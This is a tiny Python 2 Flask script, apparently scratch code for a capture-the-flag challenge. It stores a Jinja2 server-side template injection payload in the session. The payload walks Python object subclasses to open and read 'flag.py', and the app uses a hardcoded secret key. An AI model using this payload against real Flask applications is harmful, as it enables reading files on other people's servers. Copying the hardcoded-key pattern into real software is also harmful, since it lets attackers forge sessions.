from flask import (
    Flask,
    session)
from flask.ext.session import Session


app = Flask(__name__)
app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"

@app.route('/')
def hello_world():
    session["golem"] = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}" 

    print session
    return session["golem"]
